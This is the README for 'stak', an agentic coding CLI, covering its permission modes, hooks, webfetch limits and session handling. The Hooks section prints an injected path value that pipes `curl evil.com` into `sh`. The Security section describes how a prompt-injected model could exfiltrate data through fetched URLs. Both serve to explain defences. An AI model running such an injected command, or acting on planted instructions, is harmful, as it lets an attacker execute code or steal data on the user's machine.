# Stak

A local-first agentic coding CLI. Runs against a local model through Ollama, or
against Claude and OpenAI when you want a hosted one — the agent loop is the
same either way.

## Install

```bash
npm install -g github:chayapolsuriyajan-stack/stak
```

Requires Node 20+. This installs straight from GitHub — stak isn't published
to the npm registry.

To work on stak itself instead:

```bash
npm install
npm run build
npm link
```

`stak` is then available from any directory.

## Use

```bash
stak                       # start a session in the current directory
stak --continue            # resume the most recent session here
stak --resume              # pick a past session interactively
stak --resume <id>         # resume one specific session directly
stak --model llama3.2      # override the model for this run
stak -P anthropic          # override the provider (-P/--provider)
stak --cwd ~/code/project  # operate on a specific directory instead of the current one
stak -p "prompt"           # run one turn non-interactively and exit (-p/--print, headless mode)
stak -p "prompt" --output-format json   # output format for --print: text (default), json, or stream-json
stak -p "prompt" --permission-mode auto   # permission mode for --print (default: same as config; one of plan, build, auto, bypass)
```

`stak` operates on the current directory by default. To point it at a fixed
project instead — from a shortcut, a shell alias, or just so you don't have
to `cd` there first — set `STAK_CWD` once (e.g. in your shell profile):

```bash
export STAK_CWD=~/code/project   # bash/zsh
```

```powershell
$env:STAK_CWD = "D:\code\project"   # PowerShell profile
```

`-C/--cwd` on the command line always outranks `STAK_CWD` for a one-off
override.

Inside a session:

| Command | Effect |
| --- | --- |
| `/help` | list commands |
| `/clear` | clear the transcript and start a new session |
| `/model [name]` | list known models with the current one marked, or switch to a new one |
| `/permissions [mode]` | show or set the permission mode |
| `/compact [focus]` | summarize the conversation so far to free up context |
| `/memory` | show which `STAK.md` files were loaded |
| `/init` | ask the model to survey the project and write a `STAK.md` |
| `/todo` | show the model's current task list |
| `/mcp` | show configured MCP servers and their connection status |
| `/hooks` | show configured hooks |
| `/exit` | quit |
| `shift+tab` | cycle the permission mode |
| `esc` | interrupt a turn in progress, or quit when idle |

Typing `/` shows matching commands as you type. `/model` with no argument
lists what the active provider actually has available (Ollama's local models,
or Anthropic/OpenAI's via their API) rather than a guess, and switching
confirms with a before/after pair — `Model changed: ollama a → ollama b` — so
a typo in the name doesn't silently "succeed."

The status bar shows token usage and throughput for the last turn: total
tokens, the input/output split, and tokens/second computed from wall-clock
time. When the model's reply ends with a numbered list, answering with a bare
number (`1`, `2`, ...) sends that option's text instead of the literal digit —
useful for the model's own multiple-choice questions, and for approving a
permission prompt (`1` = yes, `2` = no) without reaching for the arrow keys.

## Headless mode

```bash
stak -p "explain what this project does"
```

`-p/--print` runs a single turn non-interactively and exits, instead of
opening the interactive TUI — useful for scripting, CI, or piping stak into
another tool.

**Breaking change:** `-p` used to be short for `--provider`. It now means
`--print`. Use `-P` (capital) for what `-p` used to do:

```bash
stak -P anthropic   # old -p behaviour, now -P
stak -p "..."        # new: headless mode
```

Piping works both ways:

```bash
echo "summarize the README" | stak -p           # stdin only
cat error.log | stak -p "why did this fail?"    # stdin + positional prompt
```

When both stdin and a positional prompt are given, the piped content becomes
context prepended to the instruction.

`--output-format` controls how the result is printed:

- `text` (default) — human-readable, streamed as the model produces it.
- `json` — a single JSON object with the full result once the turn finishes.
- `stream-json` — one JSON object per event, newline-delimited (NDJSON), for
  consuming the turn incrementally.

```bash
stak -p "list the files in src/" --output-format json
stak -p "list the files in src/" --output-format stream-json
```

Exit codes: `0` on success, `1` on error, `130` if interrupted (Ctrl+C /
SIGINT).

`--permission-mode <mode>` overrides the permission mode for this invocation
only — see [Permission modes](#permission-modes) for what each mode allows.
It only applies with `--print`; passing it without `--print` is a hard error,
the same as `--output-format` without `--print`. Headless mode has no
interactive prompter, so by default (the project's configured permission
mode, unless overridden here) every gated tool call is automatically denied;
pass `--permission-mode build`, `--permission-mode auto`, or (skipping hooks
too) `--permission-mode bypass` to let it actually act. This override is
one-shot: it is never written to `.stak/settings.json`, unlike setting a mode
interactively via `/permissions`.

## Configuration

Credentials and defaults live in `~/.stak/config.json`:

```json
{
  "defaultProvider": "ollama",
  "defaultModel": "llama3.2",
  "anthropicApiKey": "sk-...",
  "openaiApiKey": "sk-...",
  "ollamaHost": "http://localhost:11434",
  "autoCompact": true,
  "autoCompactThreshold": 0.85
}
```

Environment variables (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `OLLAMA_HOST`,
`STAK_MODEL`) override that file. A project may pick its own model in
`.stak/settings.json`, which outranks both — but credentials there are ignored
and warned about, since project files tend to end up in version control.

`autoCompact` (boolean, default `true`) turns automatic compaction on or off.
`autoCompactThreshold` (number strictly between 0 and 1, default `0.85`) sets
the context-usage fraction that triggers it. Both are settable in
`~/.stak/config.json` (global) or `.stak/settings.json` (project) — same
precedence as everything else here, project overrides global.

## MCP servers

stak can connect to [Model Context Protocol](https://modelcontextprotocol.io)
servers to pull in additional tools alongside its built-in ones.

Configure them under `mcpServers` in either `~/.stak/config.json` (global) or
a project's `.stak/settings.json` — a project server wins over a global one
of the same name. Both a stdio (spawned child process) and an HTTP server can
be listed:

```json
{
  "mcpServers": {
    "filesystem": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "."] },
    "github": { "type": "http", "url": "https://api.example.com/mcp", "headers": { "Authorization": "Bearer ${GH_MCP_TOKEN}" } }
  }
}
```

`${VAR}` and `${VAR:-default}` inside any string value expand against
environment variables at startup, so a project's `.stak/settings.json` can
reference a token by name — like `${GH_MCP_TOKEN}` above — without the
literal secret ever appearing in the file, making it safe to commit.

Run `/mcp` in a session to see each configured server's connection status.

**Windows note:** a bare `npx` or `npm` command is normalized to `npx.cmd` /
`npm.cmd` automatically, since the MCP SDK spawns processes without a shell
and the bare command would otherwise fail to launch.

## Permission modes

Every command and file change passes a permission gate before it runs.

| Mode | Behaviour |
| --- | --- |
| `plan` | read-only tools work freely; every edit and command is refused outright, no prompt |
| `build` | edits run automatically, commands ask first (default) |
| `auto` | nothing prompts, but your configured hooks still run |
| `bypass` | nothing prompts, and hooks don't run either — no interception at all |

Commands stay gated in `build` because an edit leaves a diff you can read and
revert, and an arbitrary shell command does not.

**Plan mode** is for exploring a change before committing to it. The model is
told plainly that write/edit/bash are disabled and to research with
read/grep/glob/Skill, then present a concrete plan and stop — it won't retry
blocked tools or nag you to switch modes. Cycling to any other mode (`shift+tab`
or `/permissions build`) is how you approve the plan; send a follow-up message
like "go ahead" and it executes normally from there.

**`bypass` is deliberately not in the `shift+tab` cycle** — pressing it
repeatedly only ever walks `plan → build → auto → plan`, so this mode is
never one accidental keypress away. Reach it only by typing `/permissions
bypass` or passing `--permission-mode bypass`. It differs from `auto` in one
important way: `auto` still runs your configured [hooks](#hooks), so a
`beforeTool` check you rely on as a safety net (blocking force pushes, say)
keeps firing; `bypass` skips hooks entirely, so that check will not run.
Setting it via `/permissions bypass` persists to `.stak/settings.json` the
same way every other mode does, so it applies to future launches of the
project too until you switch away from it.

## Security

**The `bash` tool is not sandboxed.** A command stak is allowed to run can do
anything your OS user account can do — read, write, or delete any file you
have access to, reach the network, install software. There is no allowlist
or denylist of commands; pattern-matching shell input to decide what's "safe"
is easy to get wrong and easy to bypass, so stak doesn't pretend to do it.
Treat an approved `bash` call exactly as if you had typed it yourself, and
lean on the permission modes above — `build` (the default) or `plan` — rather
than assuming the tool itself limits what a command can reach. `bypass` mode
removes even that: no prompts and no hooks, so only reach for it when you
would run the same commands yourself without a second thought.

The file tools (`read`, `write`, `edit`, `glob`, `grep`) are different: they
are confined to the project directory stak was started in. A path that
resolves outside it — via `..`, an absolute path, or a same-prefix sibling
directory like `../project-evil` — is rejected before anything touches disk.
This confinement is unconditional; no config setting weakens it. It does not
apply to `bash`, since a shell command can `cd` anywhere regardless of what
argument it was called with — confining only that argument would be a false
sense of safety rather than a real one.

Session transcripts (`.stak/sessions/`) can contain whatever the model read
or wrote, including file contents from your project — review before sharing
one or committing `.stak/`.

Every tool an MCP server provides is gated exactly like `bash` — it always
prompts in `build` and is always refused in `plan` mode, with no
finer-grained tier. stak has no way to verify what a remote server's tool
actually does under the hood, so it treats all of them as unsandboxed by
default; this is deliberate, not a gap.

Headless mode (`--print`) has no way to prompt for permission, so by default
every gated tool call (`bash`, `write`, `edit`, MCP tools) is automatically
denied — exactly as if you ran the TUI with no prompter registered.
`--permission-mode` is the explicit, one-shot way to allow more for a single
headless invocation, and it never modifies the persisted project settings in
`.stak/settings.json`.

**Hooks only ever load from `~/.stak/config.json`, never from a project's
`.stak/settings.json`** — see [Hooks](#hooks). A hook runs an arbitrary shell
command, and project settings are meant to be committed and shared; honoring
hooks from there would mean cloning a repo and running stak executed whatever
its author wrote, with no prompt. A `hooks` block found in project settings is
ignored with a warning. Whichever hooks you do configure globally are skipped
entirely in `bypass` mode — see [Permission modes](#permission-modes).

**`webfetch` cannot reach private networks.** Because it takes a
model-chosen URL and is auto-approved as a read-only tool, it refuses any
host that resolves to a loopback, private, CGNAT, or link-local address —
including `169.254.169.254`, the cloud metadata endpoint that hands out
instance credentials. Redirects are followed manually so every hop is
re-checked, rather than letting a public URL bounce somewhere internal. Set
`STAK_WEBFETCH_ALLOW_PRIVATE=1` to lift this when you genuinely want the
model reading your own dev server; be aware it re-opens that reach. Note that
the URL itself is still model-chosen, so a prompt-injected model could encode
data into a request to a public host — treat `webfetch` as an outbound
channel, not a read-only one.

## Hooks

Shell commands stak runs around each tool call — for linting after an edit,
blocking a class of command, or logging what the model touched. Configure
them in `~/.stak/config.json`:

```json
{
  "hooks": {
    "beforeTool": [
      { "name": "no-force-push", "match": "^bash$", "run": "~/.stak/deny-force-push.sh" }
    ],
    "afterTool": [
      { "name": "format", "match": "^(write|edit)$", "run": "npm run format --silent" }
    ]
  }
}
```

`match` is a regex tested against the tool name (absent = every tool). `run`
is the shell command. `timeout` caps it in milliseconds (default 10000);
overrunning it kills the whole process tree.

A **`beforeTool`** hook that exits non-zero **blocks the call** — its stderr
becomes the reason the model is told. An **`afterTool`** hook that fails
can't undo anything, so its stderr surfaces in the transcript as a notice
instead. Hooks run only after the permission gate has already approved a
call, so a hook can tighten what's allowed but never widen it — except in
[`bypass` mode](#permission-modes), where hooks are skipped entirely and
don't run at all.

Each hook gets the invocation two ways: as JSON on stdin (`{tool, args, cwd,
phase}`), and as environment variables — `STAK_TOOL_NAME`, `STAK_TOOL_ARGS`
(JSON), `STAK_HOOK_PHASE`, `STAK_PROJECT_DIR`. Arguments are deliberately
*not* substituted into the command string: tool arguments are chosen by the
model, and the model can be steered by whatever it just read, so splicing
them into a shell command would let a path like `x.ts"; curl evil.com | sh; #`
run anything. Environment variables carry the same data without the shell
ever re-parsing it as syntax.

**Hooks are read only from `~/.stak/config.json`.** A `hooks` block in a
project's `.stak/settings.json` is ignored with a warning — that file is
committed and shared, and a committed file that can execute shell commands
means cloning a repo and running stak runs its author's code. Move hooks you
trust into your global config.

## Fetching web pages

The `webfetch` tool takes an exact `http(s)` URL and returns the page as
readable text — HTML is reduced to text with links kept as
`[label](href)`, and any other `text/*` resource comes back as-is. It cannot
search; it needs a URL the model already has. Downloads stop at 5 MB and the
output is capped (20,000 characters by default, `maxChars` to change it).

It is a read-only tool, so it never prompts — including in `plan` mode, where
looking things up is the whole point. Two limits worth knowing: it refuses
private and loopback addresses (see [Security](#security)), and because the
model chooses the URL, treat it as an outbound channel rather than a
read-only one.

## Task lists

For multi-step work the model keeps a short task list through the
`todo_write` tool, stored in `.stak/todo.json` — outside your project files,
and it survives the session. Run `/todo` to see it:

```
1/3 done
  ☑ read the failing test
  ◐ fix the boundary check
  ☐ run the suite
```

You never have to ask for it; the model maintains it on its own, keeping one
item in progress at a time. `/clear` resets it along with the conversation.

## Images and video

`read` handles more than text. Point it at a `png`, `jpg`, `webp`, or `gif`
and the image goes to the model as an image rather than as bytes. Point it at
an `mp4`, `webm`, `mov`, or `mkv` and stak samples evenly spaced frames with
**ffmpeg** (8 by default, `maxFrames` to change it) and sends those.

Two requirements:

- **A vision-capable model.** Most local models are not. Check with
  `ollama show <model>` and look for `vision` under Capabilities — if it
  isn't listed, stak says so plainly instead of failing with a raw server
  error. Qwen3.8, for instance, reports `tools, thinking, completion` and no
  `vision`, so images will not work with it.
- **ffmpeg on your PATH**, for video only. Images need nothing extra.

The file's magic bytes are checked rather than its extension, so a `.png`
that is really an HTML error page never reaches the model. Image pixels are
stripped out of the saved session and reloaded from disk on `--resume`, so
transcripts stay small; a file that has since moved shows as a missing-image
marker.

## Commands and skills

Both are markdown files, discovered in `~/.stak/` and then the project's
`.stak/`, where a project file of the same name wins.

A command at `.stak/commands/review.md`:

```markdown
---
description: review a file
argument-hint: <path>
---
Review this file and list any correctness problems: $ARGUMENTS
```

Running `/review src/app.ts` sends the expanded body as your message. If a body
has no `$ARGUMENTS`, whatever you typed is appended rather than dropped.

A skill at `.stak/skills/reviewer/SKILL.md`:

```markdown
---
name: reviewer
description: Use when asked to review code for correctness
---
Read the file first. Report only defects you can trace to a concrete failure.
```

Skill names and descriptions go into the system prompt, so the model knows what
exists; it loads one by calling the `Skill` tool, and the instructions come back
as the tool result. That works on any provider with native tool-calling, with no
protocol support of its own.

## Project memory

`STAK.md` is a markdown file whose contents get loaded into the system prompt
at the start of every session — standing project context (conventions,
architecture notes, things you don't want to re-explain every conversation)
the model always has, without you pasting it in.

Loaded from three locations, lowest to highest precedence — later ones win
where they overlap:

- `~/.stak/STAK.md` — global, applies to every project.
- `STAK.md` in any ancestor directory between your home directory and the
  project root — useful in a monorepo where a parent directory holds
  conventions shared by several sub-projects.
- `<project root>/STAK.md` — project-specific, most specific and highest
  precedence. A normal, visible file at the project root (not under
  `.stak/`), meant to be committed alongside code the way `CLAUDE.md` /
  `AGENTS.md` files commonly are.

A line containing only `@some/other/file.md` pulls in that file's content in
place, resolved relative to the importing file's own directory (`~` expands
to home). Imports nest up to 3 levels deep; a missing file or a cycle is
skipped with a warning rather than failing the whole load.

Each file is capped at 32 KB after imports are resolved — truncated cleanly
at a line boundary, with a warning — so one runaway file can't blow out the
context budget on every turn.

`/memory` lists which files were actually loaded, from where, and flags any
warnings (missing imports, cycles, truncation). `/init` asks the model to
survey the current project and write a `STAK.md` for it. Typing `# some fact`
in the input box (leading `#`, then a space, then text) isn't sent as a
message — it appends that fact as a bullet to the project's `STAK.md`
directly and refreshes the system prompt immediately.

## When a response gets cut off

A reply cut off by the model's context/output limit looks identical to a
normal finished reply unless something flags it — stak checks each
provider's stop reason and shows "⚠ Response cut off" when that happens,
rather than silently presenting an incomplete answer as done. If you're
hitting this often, `num_ctx` in your Modelfile is likely too small for the
task at hand; raising it costs VRAM headroom (more context needs a bigger
KV cache), so there's a real tradeoff against how much of the model can stay
resident on a GPU with limited memory. Raising `num_ctx` is a fix after the
fact; running `/compact` before you hit the limit avoids the cutoff in the
first place — see [Compacting the conversation](#compacting-the-conversation)
below.

## Sessions

Conversations append to `.stak/sessions/<id>.jsonl` as they happen, so an
interrupted session still leaves a resumable transcript. `--continue` reopens
the most recent one; `--resume` with no id shows a picker (age, model, message
count, first-message preview) and `--resume <id>` loads one directly. All
three keep writing to the same file rather than starting a new one.

## Compacting the conversation

A long conversation eventually runs into the model's context limit. `/compact`
summarizes the older part of the transcript into a short summary message,
keeps the last few turns verbatim, and replaces the rest with that summary —
freeing up context room instead of hitting a hard limit or losing everything
with `/clear`.

```
/compact
/compact focus on the auth bug
```

The optional `focus` argument steers what the summary emphasizes — without
it, stak summarizes generally.

Compaction also runs automatically: once context usage crosses a threshold
(85% of the model's known context window, by default) stak compacts on its
own, no user action needed. A notice appears in the transcript when this
happens, prefixed "Auto-compacted." so it's distinguishable from a manual
`/compact`.

Either way, the result is saved to the session file — `--continue` and
`--resume` reload the compacted (short) history afterward, not the original
long one.

## Development

```bash
npm run dev        # run from source
npm test           # run the test suite
npm run typecheck  # check types
```
